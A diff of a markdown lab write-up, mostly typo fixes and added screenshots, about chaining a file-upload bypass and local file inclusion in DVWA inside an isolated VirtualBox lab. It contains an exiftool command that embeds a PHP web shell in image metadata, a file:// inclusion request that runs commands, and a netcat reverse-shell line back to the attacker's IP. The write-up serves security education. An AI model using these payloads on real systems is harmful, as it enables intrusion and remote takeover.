@@ -22,7 +22,7 @@ The objective of the attack is to achieve Remote Code Execution (RCE) and establ
 Consequences of this kind of attack can be loss of confidentiality and integrity for the application data, that may lead to local privilege escalation.
 
 ## Technical Configuration
-This simulation has been done using Oracle VM Virtualbox, building an enviroment with two separate virtual machines both running Kali Linux  as O.S., configured respectively as the victim (hosting the Web App) and the attacker (gaining access to the target). 
+This simulation has been done using Oracle VM Virtualbox, building an environment with two separate virtual machines both running Kali Linux  as O.S., configured respectively as the victim (hosting the Web App) and the attacker (gaining access to the target). 
 #### Network Configuration
 The two virtual machines are interconnected via an isolated Host-Only Network inside VirtualBox, in order to ensure that all malicious traffic, payloads, and the final Reverse Shell remain strictly inside the local simulated environment.
 
@@ -45,7 +45,9 @@ Command-line, open source networking utility used for reading from and writing t
 ## Attack Flow
 
 ### Phase 0 - Initialization
-First of all, the target environment hosting the Damn Vulnerable Web Application (DVWA) was initialized. The target virtual machine was booted, ensuring that services needed to host teh web application were fully operational.
+First of all, the target environment hosting the Damn Vulnerable Web Application (DVWA) was initialized. The target virtual machine was booted, ensuring that services needed to host the web application were fully operational.
+
+![Victim Configuration](images/victConf.png)
 
 ### Phase 1 - Defense Analysis
 The DVWA level is configured to **High**
@@ -54,10 +56,15 @@ The DVWA level is configured to **High**
 
 Which means that stricter defensive mechanisms are implemented:
 - for File Upload: the file has to be necessarily *.jpeg or *.png, otherwise it would be rejected; by checking the Source Code of the webpage, it is clear that not only file having the correct extension suffices to bypass this restriction: the php function `getimagesize()` is used to validate the input, as it would return 0 if the input cannot be recognized as a picture; in addition, it does not consider file's metadata (feature that is going to be exploited);
+
+![File Upload Code](images/fileUploadCode.png)
+
 - for File Inclusion: the application restricts input by whitelisting filenames, requiring them to begin with the substring "file", as can be seen in the Source Code of the page. 
 
+![File Inclusion Code](images/fileInclusion.png)
+
 ### Phase 2 - Payload Creation
-The aim of this phase is to create a file to upload that contains PHP code in a way that it would be accepted from the Web Application.
+The aim of this phase is to create a file to upload that contains PHP code in a way that it would be accepted by the Web Application.
 First of all download a real JPEG picture; secondly, using `exiftool`, inject a command into the picture's metadata:
 ```bash
 exiftool -Comment="<?php system($_GET['cmd']); ?>" image.jpeg
@@ -66,7 +73,7 @@ The command puts in the metadata's Comment field a PHP script that will trigger 
 
 Finally, change the file name into `shell.jpeg`, in order to distinguish it better from the original one, without altering the original extension. 
 
-Now the file is ready to be loaded and accepted from the Web Application.
+Now the file is ready to be loaded and accepted by the Web Application.
 
 ### Phase 3 - Payload Upload
 In the "File Upload" section of the DVWA we can upload the file prepared: it is accepted since it has the correct extension and the first bytes of the file correspond to a jpeg's ones. If the upload is successful, a message telling the location of the file and the success of the operation will appear.
@@ -74,7 +81,7 @@ In the "File Upload" section of the DVWA we can upload the file prepared: it is 
 ![Figure 1: File Upload](images/fileUpload.png)
 
 ### Phase 4 - Listening Session
-In order to execute RCE, a listening session has to be opened. In a new terminal, using `nc` (NetCat) command with the following flags on:
+In order to execute RCE, a listening session has to be opened. In a new terminal, using `nc` (NetCat) command with the following flags on (a common combination):
 ```bash
 nc -lvnp 4444
 ```
@@ -88,10 +95,10 @@ For this phase, go to the File Inclusion section. In order to execute the file o
 .../fi/?page=file:///var/www/html/DVWA/hackable/uploads/shell.jpeg&cmd=ip%20a
 ```
 which is composed from:
-- `file://`, the beginning of the format "File URI scheme", which is a specific format of URI, used to specifically identify a file on a host computer; with this format, PHP understands that it has to access directly the local filesystem in order to search for the resource and forward it to the `include()` function; in addition, this beginning string is needed because of the DVWA File Inclusion restrictions;
+- `file://`, the beginning of the format "File URI scheme", which is a specific format of URI, used to specifically identify a file on a host computer; with this format, PHP understands that it has to access directly the local filesystem in order to search for the resource inside of it; in addition, this beginning string is needed because of the DVWA File Inclusion restrictions;
 - `/var/.../shell.jpeg`, the absolute path to the injected image file created and uploaded before;
-- `cmd=`, the query parameter that would be considered from the script we injected in the image;
-- `ip a`, the Linux command that will return the ip address of the machine; spaces are filled with %20 since it is the URL encoding code for the space character, to avoid wrong behaviors of the HTTP request.
+- `cmd=`, the query parameter that would be expected from the script we injected in the image;
+- `ip a`, the Linux command that will return the ip address of the machine; spaces are encoded with %20 (URL encoding), to avoid wrong behaviors of the HTTP request.
 
 After loading this webpage, the content of the file will be seen on the screen: in the first few raw image bytes will be located the result of the command `ip a`, as showed in the picture below:
 
@@ -104,11 +111,11 @@ Now, in order to connect to the listening Server previously opened, the `cmd` pa
 .../fi/?page=file:///var/www/html/DVWA/hackable/uploads/shell.jpeg&cmd=nc%20192.168.56.102%204444%20-e%20/bin/bash
 ```
 
-- `nc 192.168.56.102 4444 -e /bin/bash`, the Netcat command that will open the connection on port 4444 at 192.168.56.102, which is the ip address of the attacking machine; the `e` flag allows to execute its following code, which is `/bin/bash`, that will start a terminal.
+- `nc 192.168.56.102 4444 -e /bin/bash`, the Netcat command that will open the connection on port 4444 at 192.168.56.102, which is the ip address of the attacking machine; the `-e` flag allows to execute its following code, which is `/bin/bash`, that will start a terminal.
 
 Finally, in the terminal opened before with the listening session active, the message of a connection received will be shown. It is now connected to the victim machine with a terminal opened, as it can be seen when executing the `ip a` command, that will show the ip address 192.168.56.101, the victim's one.
 
-![Revese Shell](images/reverseShell.png)
+![Reverse Shell](images/reverseShell.png)
 
 ## Conclusions
 The simulation demonstrated how a high-security environment can be compromised through vulnerability chaining, by combining steganography with a logical bypass of the LFI filter, that made possible achieving Remote Code Execution (RCE) and establish a Reverse Shell. 
@@ -116,18 +123,18 @@ The simulation demonstrated how a high-security environment can be compromised t
 As it can be seen, restrictions adopted by the system used, like the ones on strings, are not enough to protect it. A better defense-in-depth mechanism should be followed, to enforce security controls across multiple layers of the architecture.
 
 ## Bibliography
-**DVWA**: https://github.com/digininja/DVWA
+- **DVWA**: https://github.com/digininja/DVWA
 
-**ExifTool**: https://exiftool.org/
+- **ExifTool Official Page**: https://exiftool.org/
 
-**netcat**: https://www.kali.org/tools/netcat/
+- **`netcat` Documentation**: https://www.kali.org/tools/netcat/
 
-https://www.php.net/manual/en/function.getimagesize.php#:~:text=The%20getimagesize()%20function%20will,the%20correspondent%20HTTP%20content%20type.
+- **PHP `getimagesize()` Manual**: https://www.php.net/manual/en/function.getimagesize.php#:~:text=The%20getimagesize()%20function%20will,the%20correspondent%20HTTP%20content%20type.
 
-https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
+- **OWASP Unrestricted File Upload**: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
 
-https://www.offsec.com/metasploit-unleashed/file-inclusion-vulnerabilities/
+- **OffSec File Inclusion Vulnerabilities**: https://www.offsec.com/metasploit-unleashed/file-inclusion-vulnerabilities/
 
-https://en.wikipedia.org/wiki/File_URI_scheme
+- **RFC 8089 - The "file" URI Scheme**: https://en.wikipedia.org/wiki/File_URI_scheme
 
-**LLM usage**: LLM were used for the project idea and text structure revision.
+**About LLM usage**: LLM were utilized for the project idea and text structure revision.
